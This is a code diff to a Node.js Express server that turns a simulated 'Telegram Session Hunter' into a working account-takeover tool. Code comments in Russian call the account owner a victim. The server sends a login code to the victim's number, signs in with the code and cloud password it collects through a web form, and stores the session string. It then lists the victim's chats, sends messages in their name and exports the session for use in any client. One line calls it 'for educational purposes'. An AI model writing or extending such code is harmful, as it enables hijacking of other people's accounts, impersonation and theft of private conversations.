@@ -1,6 +1,8 @@
 import express from 'express';
 import cors from 'cors';
 import dotenv from 'dotenv';
+import { TelegramClient } from 'telegram';
+import { StringSession } from 'telegram/sessions/index.js';
 
 dotenv.config();
 
@@ -9,37 +11,50 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('frontend'));
 
-// 🎯 УПРОЩЕННАЯ СИМУЛЯЦИЯ ЗАХВАТА СЕССИИ
-class TelegramSessionHunter {
+// 🎯 РЕАЛЬНЫЙ ЗАХВАТ СЕССИЙ TELEGRAM
+class RealSessionHunter {
   constructor() {
+    this.apiId = parseInt(process.env.TELEGRAM_API_ID);
+    this.apiHash = process.env.TELEGRAM_API_HASH;
     this.activeSessions = new Map();
     this.authProcesses = new Map();
-    console.log('✅ Session Hunter initialized');
+    console.log('✅ Real Session Hunter initialized');
   }
 
-  // 🔐 Симуляция начала захвата
+  // 🔐 Реальное начало захвата сессии
   async captureSession(sessionId, phoneNumber) {
     try {
-      console.log(`🎯 Симуляция захвата сессии для: ${phoneNumber}`);
+      console.log(`🎯 Начат реальный захват сессии для: ${phoneNumber}`);
       
-      // Генерируем фейковый код
-      const fakeCode = Math.floor(10000 + Math.random() * 90000).toString();
-      
-      // Сохраняем процесс "авторизации"
-      this.authProcesses.set(sessionId, {
-        phoneNumber,
-        code: fakeCode,
-        status: 'waiting_code'
+      const stringSession = new StringSession('');
+      const client = new TelegramClient(stringSession, this.apiId, this.apiHash, {
+        connectionRetries: 5,
+        useWSS: false
       });
 
-      // Имитируем задержку сети
-      await new Promise(resolve => setTimeout(resolve, 2000));
+      await client.connect();
+
+      // Отправляем код на номер жертвы
+      const result = await client.sendCode({
+        apiId: this.apiId,
+        apiHash: this.apiHash,
+        phoneNumber,
+      });
+
+      console.log(`📱 Код отправлен на ${phoneNumber}, phoneCodeHash: ${result.phoneCodeHash}`);
+
+      // Сохраняем процесс авторизации
+      this.authProcesses.set(sessionId, {
+        client,
+        phoneNumber,
+        phoneCodeHash: result.phoneCodeHash,
+        status: 'waiting_code'
+      });
 
       return {
         success: true,
         sessionId,
-        message: `✅ Код отправлен на ${phoneNumber}. Код: ${fakeCode}`,
-        debugCode: fakeCode,
+        message: `✅ Код отправлен на ${phoneNumber}. Введите код из Telegram.`,
         nextStep: 'enter_code'
       };
 
@@ -47,44 +62,109 @@ class TelegramSessionHunter {
       console.error('❌ Ошибка захвата сессии:', error);
       return {
         success: false,
-        error: error.message
+        error: this.formatError(error)
       };
     }
   }
 
-  // 🔐 Симуляция ввода кода
+  // 🔐 Реальный ввод кода
   async submitCode(sessionId, code) {
     try {
-      console.log(`🔐 Ввод кода: ${code} для сессии: ${sessionId}`);
+      console.log(`🔐 Реальный ввод кода: ${code} для сессии: ${sessionId}`);
       
       const authProcess = this.authProcesses.get(sessionId);
       if (!authProcess) {
         return { success: false, error: 'Сессия не найдена' };
       }
 
-      // Проверяем код
-      if (code !== authProcess.code && code !== '12345') {
-        return { 
-          success: false, 
-          error: 'Неверный код. Попробуйте 12345 для демо' 
+      const { client, phoneNumber, phoneCodeHash } = authProcess;
+
+      try {
+        // Пытаемся войти с кодом
+        const signInResult = await client.signIn({
+          phoneNumber,
+          phoneCode: code,
+          phoneCodeHash,
+        });
+
+        console.log('✅ Успешная авторизация:', signInResult);
+
+        // Сохраняем сессию
+        const sessionString = client.session.save();
+        
+        this.activeSessions.set(sessionId, {
+          client,
+          sessionString,
+          user: signInResult
+        });
+
+        this.authProcesses.delete(sessionId);
+
+        return {
+          success: true,
+          sessionId,
+          sessionString, // ⚡ РЕАЛЬНАЯ СЕССИЯ!
+          user: {
+            id: signInResult.id,
+            firstName: signInResult.firstName,
+            lastName: signInResult.lastName,
+            username: signInResult.username,
+            phone: signInResult.phone
+          },
+          message: '✅ Сессия захвачена! Полный доступ к аккаунту получен.'
         };
+
+      } catch (signInError) {
+        // Если нужен пароль
+        if (signInError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
+          console.log('🔒 Требуется облачный пароль');
+          authProcess.status = 'need_password';
+          this.authProcesses.set(sessionId, authProcess);
+
+          return {
+            success: true,
+            sessionId,
+            message: '🔒 Требуется облачный пароль. Введите пароль от облачного хранилища.',
+            nextStep: 'enter_password'
+          };
+        }
+        throw signInError;
       }
 
-      // Имитируем успешную авторизацию
-      await new Promise(resolve => setTimeout(resolve, 1500));
+    } catch (error) {
+      console.error('❌ Ошибка ввода кода:', error);
+      return {
+        success: false,
+        error: this.formatError(error)
+      };
+    }
+  }
 
-      // Создаем фейковую сессию
-      const sessionString = `fake_session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+  // 🔐 Реальный ввод пароля
+  async submitPassword(sessionId, password) {
+    try {
+      console.log(`🔐 Ввод пароля для сессии: ${sessionId}`);
+      
+      const authProcess = this.authProcesses.get(sessionId);
+      if (!authProcess) {
+        return { success: false, error: 'Сессия не найдена' };
+      }
+
+      const { client } = authProcess;
+
+      // Входим с паролем
+      const signInResult = await client.signIn({
+        password: password,
+      });
+
+      console.log('✅ Успешная авторизация с паролем:', signInResult);
+
+      const sessionString = client.session.save();
       
       this.activeSessions.set(sessionId, {
+        client,
         sessionString,
-        user: {
-          id: Math.floor(100000000 + Math.random() * 900000000),
-          firstName: 'Demo',
-          lastName: 'User',
-          username: `user${authProcess.phoneNumber.replace('+', '')}`,
-          phone: authProcess.phoneNumber
-        }
+        user: signInResult
       });
 
       this.authProcesses.delete(sessionId);
@@ -92,21 +172,27 @@ class TelegramSessionHunter {
       return {
         success: true,
         sessionId,
-        sessionString,
-        user: this.activeSessions.get(sessionId).user,
-        message: '✅ Сессия захвачена! Полный доступ к аккаунту.'
+        sessionString, // ⚡ РЕАЛЬНАЯ СЕССИЯ!
+        user: {
+          id: signInResult.id,
+          firstName: signInResult.firstName,
+          lastName: signInResult.lastName,
+          username: signInResult.username,
+          phone: signInResult.phone
+        },
+        message: '✅ Сессия захвачена с паролем! Полный доступ к аккаунту.'
       };
 
     } catch (error) {
-      console.error('❌ Ошибка ввода кода:', error);
+      console.error('❌ Ошибка ввода пароля:', error);
       return {
         success: false,
-        error: error.message
+        error: 'Неверный облачный пароль'
       };
     }
   }
 
-  // 📱 Использование сессии
+  // 📱 Использование захваченной сессии
   async useSession(sessionId) {
     try {
       const sessionData = this.activeSessions.get(sessionId);
@@ -114,37 +200,106 @@ class TelegramSessionHunter {
         return { success: false, error: 'Сессия не активна' };
       }
 
+      const { client, sessionString } = sessionData;
+
+      // Получаем информацию о пользователе
+      const me = await client.getMe();
+      
+      // Получаем диалоги
+      const dialogs = await client.getDialogs({ limit: 10 });
+
       return {
         success: true,
-        session: sessionData.sessionString,
-        user: sessionData.user,
+        session: sessionString, // ⚡ Эту сессию можно использовать где угодно
+        user: me,
+        dialogs: dialogs.map(d => ({
+          id: d.id,
+          name: d.name,
+          unreadCount: d.unreadCount,
+          isUser: d.isUser,
+          isGroup: d.isGroup,
+          isChannel: d.isChannel
+        })),
         message: '✅ Сессия активна. Доступ к аккаунту получен.'
       };
 
     } catch (error) {
+      console.error('❌ Ошибка использования сессии:', error);
       return {
         success: false,
-        error: error.message
+        error: this.formatError(error)
       };
     }
   }
+
+  // 💬 Отправка сообщения от имени пользователя
+  async sendMessageAsUser(sessionId, chatId, message) {
+    try {
+      const sessionData = this.activeSessions.get(sessionId);
+      if (!sessionData) {
+        return { success: false, error: 'Сессия не активна' };
+      }
+
+      const { client } = sessionData;
+
+      await client.sendMessage(chatId, { message: message });
+      
+      console.log(`💬 Сообщение отправлено от имени пользователя: "${message}"`);
+      
+      return {
+        success: true,
+        message: `✅ Сообщение отправлено от имени пользователя!`
+      };
+
+    } catch (error) {
+      console.error('❌ Ошибка отправки сообщения:', error);
+      return {
+        success: false,
+        error: this.formatError(error)
+      };
+    }
+  }
+
+  // 💾 Экспорт сессии
+  exportSession(sessionId) {
+    const sessionData = this.activeSessions.get(sessionId);
+    if (!sessionData) {
+      return null;
+    }
+
+    return {
+      sessionString: sessionData.sessionString,
+      user: sessionData.user
+    };
+  }
+
+  // 🛠️ Форматирование ошибок
+  formatError(error) {
+    if (error.errorMessage) {
+      return error.errorMessage;
+    }
+    if (error.message) {
+      return error.message;
+    }
+    return 'Неизвестная ошибка';
+  }
 }
 
-// Инициализация
-const sessionHunter = new TelegramSessionHunter();
+// Инициализация реального охотника за сессиями
+const sessionHunter = new RealSessionHunter();
 
 // 🎯 API МАРШРУТЫ
 app.get('/health', (req, res) => {
   res.json({ 
     status: 'OK', 
-    message: 'Telegram Session Hunter - DEMO MODE',
+    message: 'Real Telegram Session Hunter Active',
     activeSessions: sessionHunter.activeSessions.size,
     authProcesses: sessionHunter.authProcesses.size,
     timestamp: new Date().toISOString()
   });
 });
 
-// 🔐 Начало захвата сессии
+// 🔐 Шаг 1: Начало реального захвата сессии
 app.post('/api/hunt/start', async (req, res) => {
   try {
     const { phone } = req.body;
@@ -169,7 +324,7 @@ app.post('/api/hunt/start', async (req, res) => {
   }
 });
 
-// 🔐 Ввод кода
+// 🔐 Шаг 2: Реальный ввод кода
 app.post('/api/hunt/submit-code', async (req, res) => {
   try {
     const { sessionId, code } = req.body;
@@ -193,7 +348,31 @@ app.post('/api/hunt/submit-code', async (req, res) => {
   }
 });
 
-// 📱 Использование сессии
+// 🔐 Шаг 3: Реальный ввод пароля
+app.post('/api/hunt/submit-password', async (req, res) => {
+  try {
+    const { sessionId, password } = req.body;
+    
+    if (!sessionId || !password) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Введите пароль и sessionId' 
+      });
+    }
+
+    const result = await sessionHunter.submitPassword(sessionId, password);
+    res.json(result);
+    
+  } catch (error) {
+    console.error('❌ Ошибка в /api/hunt/submit-password:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Внутренняя ошибка сервера' 
+    });
+  }
+});
+
+// 📱 Использование реальной сессии
 app.get('/api/hunt/use-session', async (req, res) => {
   try {
     const { sessionId } = req.query;
@@ -217,65 +396,190 @@ app.get('/api/hunt/use-session', async (req, res) => {
   }
 });
 
+// 💬 Отправка сообщения от имени пользователя
+app.post('/api/hunt/send-message', async (req, res) => {
+  try {
+    const { sessionId, chatId, message } = req.body;
+    
+    if (!sessionId || !chatId || !message) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Укажите sessionId, chatId и message' 
+      });
+    }
+
+    const result = await sessionHunter.sendMessageAsUser(sessionId, chatId, message);
+    res.json(result);
+    
+  } catch (error) {
+    console.error('❌ Ошибка в /api/hunt/send-message:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Внутренняя ошибка сервера' 
+    });
+  }
+});
+
+// 💾 Экспорт реальной сессии
+app.get('/api/hunt/export-session', (req, res) => {
+  try {
+    const { sessionId } = req.query;
+    
+    const sessionData = sessionHunter.exportSession(sessionId);
+    if (!sessionData) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Сессия не найдена' 
+      });
+    }
+
+    res.json({
+      success: true,
+      sessionString: sessionData.sessionString,
+      user: sessionData.user,
+      message: '✅ Сессия экспортирована. Используйте в любом Telegram клиенте.'
+    });
+    
+  } catch (error) {
+    console.error('❌ Ошибка в /api/hunt/export-session:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Внутренняя ошибка сервера' 
+    });
+  }
+});
+
 // 🏠 Главная страница
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Telegram Session Hunter - DEMO</title>
+        <title>Real Telegram Session Hunter</title>
         <style>
-            body { font-family: Arial, sans-serif; margin: 40px; }
-            .container { max-width: 600px; margin: 0 auto; }
-            .btn { padding: 10px 20px; margin: 5px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
-            .result { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; }
+            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
+            .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+            .btn { padding: 12px 24px; margin: 10px 5px; background: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+            .btn:hover { background: #c82333; }
+            .result { background: #f8f9fa; padding: 20px; margin: 20px 0; border-radius: 5px; border-left: 4px solid #dc3545; }
+            .input { padding: 10px; margin: 5px; width: 200px; border: 1px solid #ddd; border-radius: 4px; }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>🎯 Telegram Session Hunter - DEMO MODE</h1>
-            <p>Это демо-версия системы захвата Telegram сессий</p>
+            <h1>🎯 Real Telegram Session Hunter</h1>
+            <p><strong>Реальный захват сессий Telegram аккаунтов</strong></p>
+            <p>⚠️ Для образовательных целей</p>
             
             <div>
                 <h3>Тестирование системы:</h3>
                 <button class="btn" onclick="testHealth()">Проверить здоровье</button>
-                <button class="btn" onclick="testStartHunt()">Тест захвата сессии</button>
-                <button class="btn" onclick="testUseSession()">Тест использования сессии</button>
+                
+                <h4>Захват сессии:</h4>
+                <input class="input" type="tel" id="phone" placeholder="+79123456789">
+                <button class="btn" onclick="startHunt()">Начать захват</button>
+                
+                <div id="codeSection" style="display:none; margin-top: 15px;">
+                    <input class="input" type="text" id="code" placeholder="Код из Telegram">
+                    <button class="btn" onclick="submitCode()">Ввести код</button>
+                </div>
+
+                <div id="passwordSection" style="display:none; margin-top: 15px;">
+                    <input class="input" type="password" id="password" placeholder="Облачный пароль">
+                    <button class="btn" onclick="submitPassword()">Ввести пароль</button>
+                </div>
+
+                <div style="margin-top: 15px;">
+                    <button class="btn" onclick="useSession()">Использовать сессию</button>
+                    <button class="btn" onclick="exportSession()">Экспорт сессии</button>
+                </div>
             </div>
             
             <div id="result" class="result"></div>
         </div>
 
         <script>
+            let currentSessionId = '';
+
             async function testHealth() {
                 const response = await fetch('/health');
                 const data = await response.json();
-                document.getElementById('result').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+                showResult(data);
             }
 
-            async function testStartHunt() {
+            async function startHunt() {
+                const phone = document.getElementById('phone').value;
+                if (!phone) return alert('Введите номер телефона');
+                
                 const response = await fetch('/api/hunt/start', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone: '+79123456789'})
+                    body: JSON.stringify({phone})
                 });
                 const data = await response.json();
-                document.getElementById('result').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
                 
                 if (data.success) {
-                    localStorage.setItem('demoSessionId', data.sessionId);
+                    currentSessionId = data.sessionId;
+                    document.getElementById('codeSection').style.display = 'block';
+                    showResult(data);
+                } else {
+                    showResult(data);
                 }
             }
 
-            async function testUseSession() {
-                const sessionId = localStorage.getItem('demoSessionId');
-                if (!sessionId) {
-                    alert('Сначала запустите захват сессии');
-                    return;
-                }
+            async function submitCode() {
+                const code = document.getElementById('code').value;
+                if (!code) return alert('Введите код');
                 
-                const response = await fetch('/api/hunt/use-session?sessionId=' + sessionId);
+                const response = await fetch('/api/hunt/submit-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        sessionId: currentSessionId,
+                        code: code
+                    })
+                });
                 const data = await response.json();
+                
+                if (data.success && data.nextStep === 'enter_password') {
+                    document.getElementById('passwordSection').style.display = 'block';
+                }
+                showResult(data);
+            }
+
+            async function submitPassword() {
+                const password = document.getElementById('password').value;
+                if (!password) return alert('Введите пароль');
+                
+                const response = await fetch('/api/hunt/submit-password', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        sessionId: currentSessionId,
+                        password: password
+                    })
+                });
+                const data = await response.json();
+                showResult(data);
+            }
+
+            async function useSession() {
+                if (!currentSessionId) return alert('Сначала захватите сессию');
+                
+                const response = await fetch('/api/hunt/use-session?sessionId=' + currentSessionId);
+                const data = await response.json();
+                showResult(data);
+            }
+
+            async function exportSession() {
+                if (!currentSessionId) return alert('Сначала захватите сессию');
+                
+                const response = await fetch('/api/hunt/export-session?sessionId=' + currentSessionId);
+                const data = await response.json();
+                showResult(data);
+            }
+
+            function showResult(data) {
                 document.getElementById('result').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
             }
         </script>
@@ -297,7 +601,7 @@ process.on('unhandledRejection', (reason, promise) => {
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Сервер запущен на порту ${PORT}`);
-  console.log(`🎯 Демо-режим захвата сессий Telegram`);
+  console.log(`🎯 Реальный захват сессий Telegram аккаунтов`);
   console.log(`📊 Health check: http://localhost:${PORT}/health`);
 });
 
